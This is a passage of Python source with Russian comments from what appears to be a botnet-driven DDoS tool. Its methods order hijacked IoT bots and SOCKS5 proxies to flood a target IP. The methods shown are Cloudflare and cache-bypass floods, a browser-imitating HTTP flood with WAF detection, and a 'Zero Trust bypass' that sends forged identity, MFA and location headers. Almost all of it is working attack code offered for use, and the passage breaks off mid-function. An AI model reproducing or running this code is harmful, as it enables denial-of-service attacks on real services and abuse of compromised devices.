                            "https://twitter.com/"
                        ]
                        headers['Referer'] = random.choice(referers)
                        
                        # Случайный метод запроса
                        methods = ["GET", "POST", "HEAD"]
                        method = random.choice(methods)
                        
                        if method == "POST":
                            # Для POST запросов добавляем тело
                            post_data = f"username=user{random.randint(1,1000)}&password=pass{random.randint(1000,9999)}"
                            headers['Content-Type'] = 'application/x-www-form-urlencoded'
                            conn.request(method, path, body=post_data, headers=headers)
                        else:
                            conn.request(method, path, headers=headers)
                        
                        response = conn.getresponse()
                        response_data = response.read()
                        
                        requests_sent += 1
                        bytes_sent += len(path) + sum(len(k) + len(v) for k, v in headers.items())
                        
                        attack_stats['total_requests'] += 1
                        attack_stats['total_bytes'] += bytes_sent
                        
                        conn.close()
                        
                        # Случайная задержка между запросами (имитация человеческого поведения)
                        delay = random.uniform(0.5, 3.0)
                        time.sleep(delay)
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                print(f"✅ {device.ip} отправил {requests_sent} bypass запросов ({mb_sent:.2f} МБ), ошибок: {failed_requests}")
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, cloudflare_bypass_attack, "Cloudflare Bypass")

    def cache_bypass_attack(self, target_ip, target_port=80, use_https=False, duration=60):
        """Cache Bypass Attack - обход кеширующих систем через уникальные параметры"""
        print(f"🔄 Запуск Cache Bypass атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'cache_hits': 0,
            'cache_misses': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        # Генераторы уникальных параметров для обхода кеша
        def generate_cache_buster_params():
            """Генерирует уникальные параметры для обхода кеша"""
            methods = [
                # Случайные параметры
                lambda: {f"cache_buster_{random.randint(100000, 999999)}": random.randint(1, 1000000)},
                # Таймстампы
                lambda: {"_": str(int(time.time() * 1000))},
                # Хэши
                lambda: {"r": hashlib.md5(str(random.random()).encode()).hexdigest()[:8]},
                # UUID
                lambda: {"uuid": str(uuid.uuid4())[:8]},
                # Случайные строки
                lambda: {f"param_{random.randint(1, 10)}": ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))}
            ]
            return random.choice(methods)()
        
        def generate_cache_buster_headers():
            """Генерирует уникальные заголовки для обхода кеша"""
            base_headers = {
                'User-Agent': random.choice(self.user_agents),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
            
            # Добавляем уникальные заголовки
            unique_headers = {
                'X-Request-ID': str(uuid.uuid4()),
                'X-Cache-Buster': hashlib.md5(str(time.time()).encode()).hexdigest()[:16],
                'X-Timestamp': str(int(time.time() * 1000)),
                'X-Random': str(random.randint(100000, 999999))
            }
            
            base_headers.update(unique_headers)
            return base_headers
        
        def generate_cache_buster_cookies():
            """Генерирует уникальные cookies для обхода кеша"""
            return {
                f'session_{random.randint(1, 5)}': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                f'cache_{random.randint(1, 3)}': str(int(time.time())),
                f'token_{random.randint(1, 2)}': str(uuid.uuid4())[:8]
            }
        
        def generate_cache_buster_paths():
            """Генерирует уникальные пути для обхода кеша"""
            base_paths = [
                "/", "/index.html", "/home", "/main", "/default",
                "/api/v1/data", "/api/v2/users", "/api/v3/products",
                "/wp-content/themes/default/style.css",
                "/static/js/main.js", "/static/css/app.css",
                "/images/header.jpg", "/downloads/file.pdf"
            ]
            
            path = random.choice(base_paths)
            
            # Добавляем параметры к пути (для обхода кеша путей)
            if random.random() > 0.3:  # 70% случаев добавляем параметры
                params = generate_cache_buster_params()
                if params:
                    query_string = "&".join([f"{k}={v}" for k, v in params.items()])
                    path = f"{path}?{query_string}" if '?' not in path else f"{path}&{query_string}"
            
            return path

        def cache_bypass_via_socks5(device, target_ip, target_port, use_https):
            """Cache bypass через SOCKS5 прокси"""
            try:
                sock = self._create_socks5_connection(device, target_ip, target_port)
                
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target_ip)
                
                # Генерируем уникальные параметры
                path = generate_cache_buster_paths()
                headers = generate_cache_buster_headers()
                
                request = f"GET {path} HTTP/1.1\r\nHost: {target_ip}\r\n"
                for key, value in headers.items():
                    request += f"{key}: {value}\r\n"
                request += "\r\n"
                
                sock.send(request.encode())
                response = sock.recv(4096)
                sock.close()
                
                return True
                
            except Exception as e:
                print(f"❌ SOCKS5 bypass ошибка: {e}")
                return False
        
        def cache_bypass_attack_single(device):
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            cache_hits = 0
            cache_misses = 0
            
            try:
                print(f"🔄 {device.ip} начинает Cache Bypass атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Выбираем метод атаки в зависимости от типа бота
                        if device.bot_type == "socks5" and self.socks5_available:
                            # Используем SOCKS5 для прокси
                            success = cache_bypass_via_socks5(device, target_ip, target_port, use_https)
                            if success:
                                requests_sent += 1
                                cache_misses += 1  # Предполагаем cache miss при успешном запросе
                            else:
                                failed_requests += 1
                        else:
                            # Прямое соединение для IoT устройств
                            if use_https:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                            else:
                                conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)
                            
                            # Генерируем уникальные параметры для обхода кеша
                            path = generate_cache_buster_paths()
                            headers = generate_cache_buster_headers()
                            cookies = generate_cache_buster_cookies()
                            
                            # Добавляем cookies в заголовки
                            cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                            headers['Cookie'] = cookie_header
                            
                            # Случайный метод запроса
                            method = random.choice(["GET", "POST", "HEAD"])
                            
                            if method == "POST":
                                # Для POST запросов добавляем уникальные данные
                                post_data = urllib.parse.urlencode({
                                    "username": f"user{random.randint(1000, 9999)}",
                                    "password": hashlib.md5(str(random.random()).encode()).hexdigest()[:10],
                                    "email": f"test{random.randint(1, 1000)}@example.com",
                                    "timestamp": str(int(time.time() * 1000))
                                })
                                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                                conn.request(method, path, body=post_data, headers=headers)
                                bytes_sent += len(post_data)
                            else:
                                conn.request(method, path, headers=headers)
                            
                            # Получаем ответ
                            response = conn.getresponse()
                            response_data = response.read()
                            
                            # Анализируем заголовки ответа для определения кеша
                            cache_headers = ['x-cache', 'x-cache-status', 'cf-cache-status', 'x-proxy-cache']
                            cache_status = 'MISS'
                            
                            for header_name in cache_headers:
                                header_value = response.getheader(header_name, '')
                                if header_value:
                                    cache_status = header_value.upper()
                                    break
                            
                            if 'HIT' in cache_status:
                                cache_hits += 1
                                attack_stats['cache_hits'] += 1
                            else:
                                cache_misses += 1
                                attack_stats['cache_misses'] += 1
                            
                            requests_sent += 1
                            bytes_sent += len(path) + sum(len(str(k)) + len(str(v)) for k, v in headers.items())
                            
                            attack_stats['total_requests'] += 1
                            attack_stats['total_bytes'] += bytes_sent
                            
                            conn.close()
                        
                        # Случайная задержка для имитации реального трафика
                        time.sleep(random.uniform(0.1, 1.0))
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                mb_sent = bytes_sent / 1024 / 1024
                cache_efficiency = (cache_hits / max(requests_sent, 1)) * 100
                
                print(f"✅ {device.ip} отправил {requests_sent} bypass запросов")
                print(f"   💾 Данных: {mb_sent:.2f} МБ")
                print(f"   🎯 Cache Miss: {cache_misses}, Cache Hit: {cache_hits}")
                print(f"   📊 Эффективность обхода кеша: {cache_efficiency:.1f}%")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        return self._run_attack(all_active_bots, attack_stats, cache_bypass_attack_single, "Cache Bypass")

    def advanced_cache_bypass_attack(self, target_ip, target_port=80, use_https=False, duration=60):
        """ИСПРАВЛЕННАЯ Продвинутая Cache Bypass атака"""
        print(f"🎯 Запуск Advanced Cache Bypass атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]
        
        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")
        
        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0
        
        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'failed_requests': 0,
            'cache_hits': 0,
            'cache_misses': 0,
            'bypass_success': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        # Исправленные методы генерации параметров
        def generate_advanced_cache_buster_params():
            """Генерирует расширенные уникальные параметры"""
            methods = [
                # Хэши на основе времени
                lambda: {f"cb_{hashlib.sha256(str(time.time()).encode()).hexdigest()[:8]}": 
                        hashlib.md5(str(random.random()).encode()).hexdigest()[:10]},
                
                # Кодированные параметры
                lambda: {"data": base64.b64encode(os.urandom(8)).decode()[:12]},
                
                # Эмуляция реальных параметров API
                lambda: {
                    "api_key": f"key_{random.randint(10000, 99999)}",
                    "session_id": str(uuid.uuid4()),
                    "timestamp": str(int(time.time() * 1000)),
                    "nonce": random.randint(100000, 999999)
                }
            ]
            return random.choice(methods)()
        
        def generate_advanced_headers():
            """Генерирует расширенные заголовки"""
            base_headers = {
                'User-Agent': random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15"
                ]),
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Connection': 'keep-alive',
            }
            
            # Уникальные заголовки
            advanced_headers = {
                'X-Request-ID': str(uuid.uuid4()),
                'X-Timestamp': str(int(time.time() * 1000)),
                'X-Client-Version': f"{random.randint(1, 10)}.{random.randint(0, 20)}"
            }
            
            base_headers.update(advanced_headers)
            return base_headers
        
        def generate_advanced_cookies():
            """Генерирует расширенные cookies"""
            return {
                'session_id': str(uuid.uuid4()),
                'user_token': hashlib.md5(str(random.random()).encode()).hexdigest()[:16],
                'last_visit': str(int(time.time()))
            }
        
        def generate_advanced_paths():
            """Генерирует умные пути с параметрами"""
            base_paths = [
                "/", "/index.html", "/api/v1/data", "/wp-json/wp/v2/posts",
                f"/user/{random.randint(1000, 9999)}", f"/product/{random.randint(1, 1000)}"
            ]
            
            path = random.choice(base_paths)
            
            # Добавляем параметры в 80% случаев
            if random.random() > 0.2:
                params = generate_advanced_cache_buster_params()
                if params:
                    query_string = "&".join([f"{k}={v}" for k, v in params.items()])
                    path = f"{path}?{query_string}" if '?' not in path else f"{path}&{query_string}"
            
            return path
        
        def advanced_cache_bypass_via_socks5(device, target_ip, target_port, use_https):
            """ИСПРАВЛЕННЫЙ Cache bypass через SOCKS5"""
            try:
                sock = self._create_socks5_connection(device, target_ip, target_port)
                
                if use_https:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=target_ip)
                
                # Генерируем параметры
                path = generate_advanced_paths()
                headers = generate_advanced_headers()
                cookies = generate_advanced_cookies()
                
                # Добавляем cookies
                cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                headers['Cookie'] = cookie_header
                
                # Создаем запрос
                request_lines = [f"GET {path} HTTP/1.1", f"Host: {target_ip}"]
                for key, value in headers.items():
                    request_lines.append(f"{key}: {value}")
                request_lines.append("\r\n")
                
                request = "\r\n".join(request_lines)
                sock.send(request.encode())
                
                # Читаем ответ
                try:
                    response = sock.recv(8192)
                    return True, "cache_miss" if b"cache" not in response.lower() else "cache_hit"
                except:
                    return True, "unknown"
                finally:
                    sock.close()
                    
            except Exception as e:
                return False, str(e)
        
        def advanced_cache_bypass_attack_single(device):
            """ИСПРАВЛЕННАЯ атака для одного устройства"""
            requests_sent = 0
            bytes_sent = 0
            failed_requests = 0
            cache_hits = 0
            cache_misses = 0
            bypass_success = 0
            
            try:
                print(f"🎯 {device.ip} начинает Advanced Cache Bypass атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        if device.bot_type == "socks5" and self.socks5_available:
                            # Через SOCKS5 прокси
                            success, cache_status = advanced_cache_bypass_via_socks5(
                                device, target_ip, target_port, use_https
                            )
                            if success:
                                requests_sent += 1
                                if cache_status == "cache_miss":
                                    cache_misses += 1
                                    bypass_success += 1
                                elif cache_status == "cache_hit":
                                    cache_hits += 1
                                attack_stats['bypass_success'] += bypass_success
                            else:
                                failed_requests += 1
                        else:
                            # Прямое соединение для IoT
                            if use_https:
                                context = ssl.create_default_context()
                                context.check_hostname = False
                                context.verify_mode = ssl.CERT_NONE
                                conn = http.client.HTTPSConnection(target_ip, target_port, timeout=10, context=context)
                            else:
                                conn = http.client.HTTPConnection(target_ip, target_port, timeout=10)
                            
                            # Генерируем параметры
                            path = generate_advanced_paths()
                            headers = generate_advanced_headers()
                            cookies = generate_advanced_cookies()
                            
                            # Добавляем cookies
                            cookie_header = "; ".join([f"{k}={v}" for k, v in cookies.items()])
                            headers['Cookie'] = cookie_header
                            
                            # Отправляем запрос
                            conn.request("GET", path, headers=headers)
                            response = conn.getresponse()
                            response_data = response.read()
                            
                            # Анализируем кеш
                            cache_status = 'unknown'
                            for header_name in ['x-cache', 'x-cache-status', 'cf-cache-status']:
                                header_value = response.getheader(header_name, '')
                                if 'hit' in header_value.lower():
                                    cache_status = 'hit'
                                    cache_hits += 1
                                    break
                                elif 'miss' in header_value.lower():
                                    cache_status = 'miss'
                                    cache_misses += 1
                                    bypass_success += 1
                                    break
                            
                            if cache_status == 'unknown':
                                # Если заголовков нет, считаем miss
                                cache_misses += 1
                                bypass_success += 1
                            
                            requests_sent += 1
                            request_size = len(path) + sum(len(str(k)) + len(str(v)) for k, v in headers.items())
                            bytes_sent += request_size
                            
                            attack_stats['total_requests'] += 1
                            attack_stats['total_bytes'] += request_size
                            attack_stats['cache_hits'] += (1 if cache_status == 'hit' else 0)
                            attack_stats['cache_misses'] += (1 if cache_status == 'miss' else 0)
                            attack_stats['bypass_success'] += bypass_success
                            
                            conn.close()
                        
                        # Умная задержка
                        delay = random.uniform(0.5, 2.0) if device.bot_type == "socks5" else random.uniform(0.1, 1.0)
                        time.sleep(delay)
                        
                    except Exception as e:
                        failed_requests += 1
                        attack_stats['failed_requests'] += 1
                        continue
                
                # Обновляем общую статистику
                attack_stats['cache_hits'] += cache_hits
                attack_stats['cache_misses'] += cache_misses
                attack_stats['bypass_success'] += bypass_success
                
                mb_sent = bytes_sent / 1024 / 1024
                total_requests = max(requests_sent, 1)
                
                print(f"✅ {device.ip} завершил:")
                print(f"   📊 Запросов: {requests_sent}, Ошибок: {failed_requests}")
                print(f"   💾 Данных: {mb_sent:.2f} МБ")
                print(f"   🎯 Cache: Hit={cache_hits}, Miss={cache_misses}")
                print(f"   ✅ Успешных обходов: {bypass_success}")
                
                return requests_sent, bytes_sent
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        # Запускаем атаку
        results = self._run_attack(
            all_active_bots, 
            attack_stats, 
            advanced_cache_bypass_attack_single, 
            "Advanced Cache Bypass"
        )
        
        # Финальная статистика
        total_requests = attack_stats['total_requests']
        if total_requests > 0:
            cache_bypass_rate = (attack_stats['cache_misses'] / total_requests) * 100
            overall_efficiency = (attack_stats['bypass_success'] / total_requests) * 100
            
            print(f"\n🎯 ADVANCED CACHE BYPASS ИТОГИ:")
            print(f"📊 Всего запросов: {total_requests}")
            print(f"❌ Ошибок: {attack_stats['failed_requests']}")
            print(f"💾 Cache Hit: {attack_stats['cache_hits']}")
            print(f"💾 Cache Miss: {attack_stats['cache_misses']}")
            print(f"✅ Успешных обходов: {attack_stats['bypass_success']}")
            print(f"📈 Эффективность обхода кеша: {cache_bypass_rate:.1f}%")
            print(f"🚀 Общая эффективность: {overall_efficiency:.1f}%")
            print(f"💽 Передано данных: {attack_stats['total_bytes'] / 1024 / 1024:.2f} МБ")
        
        return results

    def advanced_browser_http_flood(self, target_ip, target_port=80, use_https=False, duration=60, max_sessions_per_bot=5):
        """
        Продвинутый HTTP Flood с полной имитацией браузера:
        - Создает реалистичные браузерные сессии
        - Имитирует поведение реальных пользователей
        - Обходит WAF и системы защиты
        - Поддерживает состояние сессии (cookies, headers)
        - Выполняет сложные последовательности действий
        """
        print(f"🌐 Запуск Advanced Browser HTTP Flood на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots

        attack_stats = {
            'total_requests': 0,
            'total_bytes': 0,
            'successful_responses': 0,
            'failed_requests': 0,
            'sessions_created': 0,
            'waf_bypassed': 0,
            'captcha_solved': 0,
            'start_time': time.time(),
            'is_running': True
        }

        class BrowserSession:
            """Класс для имитации браузерной сессии"""
            
            def __init__(self, session_id=None):
                self.user_agents = [
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
                    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
                    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
                ]
                self.session_id = session_id or str(uuid.uuid4())
                self.user_agent = random.choice(self.user_agents)
                self.cookies = {}
                self.headers = {}
                self.referer = None
                self.last_activity = time.time()
                self.request_count = 0
                self.is_active = True
                self.js_enabled = random.random() > 0.3

                self.screen_resolution = random.choice([
                    '1920x1080', '1366x768', '1536x864', 
                    '1440x900', '1280x720', '2560x1440'
                ])
                self.language = random.choice(['en-US', 'en-GB', 'ru-RU', 'de-DE', 'fr-FR'])
                self.connection_type = random.choice(['keep-alive', 'close'])
                self.init_headers()
            
            def init_headers(self):
                """Инициализация реалистичных заголовков браузера"""
                self.headers = {
                    'User-Agent': self.user_agent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Accept-Language': f'{self.language},en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Cache-Control': 'no-cache',
                    'Connection': self.connection_type,
                    'Upgrade-Insecure-Requests': '1',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'none',
                    'Sec-Fetch-User': '?1',
                    'DNT': '1',
                    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '"Windows"',
                }
                
                # Добавляем случайные дополнительные заголовки
                if random.random() > 0.5:
                    self.headers['X-Requested-With'] = 'XMLHttpRequest'
                
                if self.referer:
                    self.headers['Referer'] = self.referer

            def update_headers(self):
                """Обновляет заголовки для следующего запроса"""
                self.headers['User-Agent'] = random.choice(self.user_agents) if random.random() > 0.9 else self.user_agent
                self.headers['Cache-Control'] = random.choice(['no-cache', 'max-age=0'])
                
                # Периодически меняем некоторые заголовки
                if random.random() > 0.8:
                    self.headers['Accept'] = random.choice([
                        'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'application/json,text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
                    ])

            def add_cookies(self, cookie_header):
                """Добавляет cookies из заголовка ответа"""
                if cookie_header:
                    try:
                        cookies = cookie_header.split(';')
                        for cookie in cookies:
                            if '=' in cookie:
                                key, value = cookie.strip().split('=', 1)
                                self.cookies[key] = value
                    except:
                        pass

            def get_cookie_header(self):
                """Формирует заголовок Cookie"""
                if self.cookies:
                    return '; '.join([f"{k}={v}" for k, v in self.cookies.items()])
                return ''

            def make_request(self):
                """Создает реалистичный HTTP запрос"""
                self.request_count += 1
                self.last_activity = time.time()
                self.update_headers()
                
                # Добавляем cookies в заголовки
                cookie_header = self.get_cookie_header()
                if cookie_header:
                    self.headers['Cookie'] = cookie_header
                
                return self.headers

        def detect_waf(self, response_headers, response_content):
            """Обнаруживает WAF и системы защиты"""
            waf_indicators = {
                'cloudflare': ['cloudflare', 'cf-ray', '__cfduid'],
                'akamai': ['akamai', 'x-akamai'],
                'imperva': ['incapsula', 'x-iinfo', 'visid_incap'],
                'sucuri': ['sucuri/', 'x-sucuri-id'],
                'fortinet': ['fortigate', 'fortiweb'],
                'aws_waf': ['aws', 'x-aws-'],
                'barracuda': ['barracuda'],
                'citrix': ['citrix', 'ns_af'],
            }
            
            headers_str = str(response_headers).lower()
            content_str = response_content.lower() if response_content else ''
            
            detected_wafs = []
            for waf, indicators in waf_indicators.items():
                for indicator in indicators:
                    if indicator in headers_str or indicator in content_str:
                        detected_wafs.append(waf)
                        break
            
            return detected_wafs

    def zero_trust_bypass(self, target_ip, target_port=443, duration=60):
        """Zero Trust Bypass атака - обход современных корпоративных защит"""
        print(f"🛡️ Запуск Zero Trust Bypass атаки на {target_ip}:{target_port}")
        
        # Автоматически используем все доступные боты
        iot_bots = [d for d in self.iot_bots if d.is_alive]
        socks5_bots = [d for d in self.socks5_bots if d.is_alive]

        print(f"🤖 Используем: {len(iot_bots)} IoT ботов + {len(socks5_bots)} SOCKS5 прокси")

        if not iot_bots and not socks5_bots:
            print("❌ Нет доступных устройств!")
            return 0

        all_active_bots = iot_bots + socks5_bots
        
        attack_stats = {
            'bypass_attempts': 0,
            'successful_bypass': 0,
            'failed_attempts': 0,
            'zt_components_hit': 0,
            'start_time': time.time(),
            'is_running': True
        }
        
        def zero_trust_attack(device):
            bypass_attempts = 0
            successful_bypass = 0
            failed_attempts = 0
            
            try:
                print(f"🛡️ {device.ip} начинает Zero Trust Bypass атаку...")
                start_time = time.time()
                
                while attack_stats['is_running'] and (time.time() - start_time) < duration:
                    try:
                        # Случайный выбор метода обхода Zero Trust
                        bypass_method = random.choice([
                            'device_posture_spoofing',
                            'identity_impersonation', 
                            'location_spoofing',
                            'network_context_faking',
                            'mfa_bypass',
                            'policy_evaluation_flood'
                        ])
                        
                        # Выполняем обход
                        success = self._execute_zt_bypass(
                            target_ip, target_port, bypass_method, device
                        )
                        
                        bypass_attempts += 1
                        attack_stats['bypass_attempts'] += 1
                        
                        if success:
                            successful_bypass += 1
                            attack_stats['successful_bypass'] += 1
                            attack_stats['zt_components_hit'] += 1
                        
                        # Случайная пауза между попытками
                        time.sleep(random.uniform(0.3, 0.7))
                        
                    except Exception as e:
                        failed_attempts += 1
                        attack_stats['failed_attempts'] += 1
                        continue
                
                print(f"✅ {device.ip}: {bypass_attempts} попыток, {successful_bypass} успешных обходов")
                return successful_bypass, bypass_attempts
                
            except Exception as e:
                print(f"❌ Ошибка у {device.ip}: {e}")
                return 0, 0
        
        results = self._run_attack(all_active_bots, attack_stats, zero_trust_attack, "Zero Trust Bypass")
        
        print(f"\n📊 Zero Trust Bypass результаты:")
        print(f"   Попыток обхода: {attack_stats['bypass_attempts']}")
        print(f"   Успешных обходов: {attack_stats['successful_bypass']}")
        print(f"   Затронуто компонентов: {attack_stats['zt_components_hit']}")
        print(f"   Эффективность: {(attack_stats['successful_bypass']/attack_stats['bypass_attempts']*100 if attack_stats['bypass_attempts'] > 0 else 0):.1f}%")
        
        return results

    def _execute_zt_bypass(self, target_ip, target_port, method, device):
        """Выполнение обхода Zero Trust защиты"""
        try:
            if method == 'device_posture_spoofing':
                return self._spoof_device_posture(target_ip, target_port, device)
            elif method == 'identity_impersonation':
                return self._impersonate_identity(target_ip, target_port, device)
            elif method == 'location_spoofing':
                return self._spoof_location(target_ip, target_port, device)
            elif method == 'network_context_faking':
                return self._fake_network_context(target_ip, target_port, device)
            elif method == 'mfa_bypass':
                return self._bypass_mfa(target_ip, target_port, device)
            elif method == 'policy_evaluation_flood':
                return self._flood_policy_evaluation(target_ip, target_port, device)
                
            return False
        except:
            return False

    def _spoof_device_posture(self, target_ip, target_port, device):
        """Спуфинг device posture (состояния устройства)"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'X-Device-ID': str(uuid.uuid4()),
            'X-Device-Type': 'managed_corporate',
            'X-OS-Version': '10.0.19043',
            'X-Client-Version': '4.2.1',
            'X-Compliant': 'true',
            'X-Encrypted': 'true',
            'X-Jailbreak-Detected': 'false',
        }
        return self._send_zt_request(target_ip, target_port, headers, device)

    def _impersonate_identity(self, target_ip, target_port, device):
        """Имперсонация легитимного пользователя"""
        headers = {
            'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.' + base64.b64encode(os.urandom(32)).decode(),
            'X-User-Identity': 'service-account@corp.com',
            'X-User-Roles': 'admin,user,reader',
            'X-Auth-Context': 'high_assurance',
            'X-Session-ID': str(uuid.uuid4()),
            'X-Tenant-ID': 'corp-prod',
        }
        return self._send_zt_request(target_ip, target_port, headers, device)

    def _spoof_location(self, target_ip, target_port, device):
        """Спуфинг геолокации и сети"""
        trusted_networks = [
            '10.0.0.0/8', '192.168.0.0/16', '172.16.0.0/12',
            'corp-vpn.example.com', 'aws-internal'
        ]
        
        headers = {
            'X-Forwarded-For': '10.1.1.1',
            'X-Real-IP': '192.168.1.100',
            'X-Network-ID': 'corp-trusted',
            'X-Geo-Location': 'US,CA,SAN FRANCISCO',
            'X-Office-Location': 'HQ-BUILDING-A',
            'X-Network-Type': 'corporate_wifi',
        }
        return self._send_zt_request(target_ip, target_port, headers, device)

    def _fake_network_context(self, target_ip, target_port, device):
        """Фальсификация сетевого контекста"""
        headers = {
            'X-Network-Context': 'trusted_corporate',
            'X-Threat-Level': 'low',
            'X-Risk-Score': '10',
            'X-Behavioral-Analytics': 'normal',
            'X-Time-Since-Last-Auth': '300',
            'X-Continuous-Verification': 'passed',
        }
        return self._send_zt_request(target_ip, target_port, headers, device)

    def _bypass_mfa(self, target_ip, target_port, device):
        """Обход MFA (Multi-Factor Authentication)"""
        headers = {
            'X-MFA-Status': 'verified',
            'X-MFA-Method': 'push_notification',
            'X-MFA-Time': str(int(time.time()) - 60),
            'X-Auth-Strength': 'high',
            'X-Step-Up-Auth': 'completed',
        }
        return self._send_zt_request(target_ip, target_port, headers, device)

    def _flood_policy_evaluation(self, target_ip, target_port, device):
        """Флуд системы оценки политик"""
        headers = {
            'X-Policy-Request-ID': str(uuid.uuid4()),
            'X-Policy-Version': 'v2.1.3',
            'X-Resource-Context': 'critical_app',
            'X-Action-Type': 'read_write',
            'X-Environment': 'production',
        }
        return self._send_zt_request(target_ip, target_port, headers, device)

    def _send_zt_request(self, target_ip, target_port, headers, device):
        """Отправка запроса с Zero Trust заголовками"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((target_ip, target_port))
            
            # Строим HTTP запрос с Zero Trust заголовками
            request_lines = [f"GET / HTTP/1.1"]
            request_lines.append(f"Host: {target_ip}")
            
            for key, value in headers.items():
                request_lines.append(f"{key}: {value}")
            
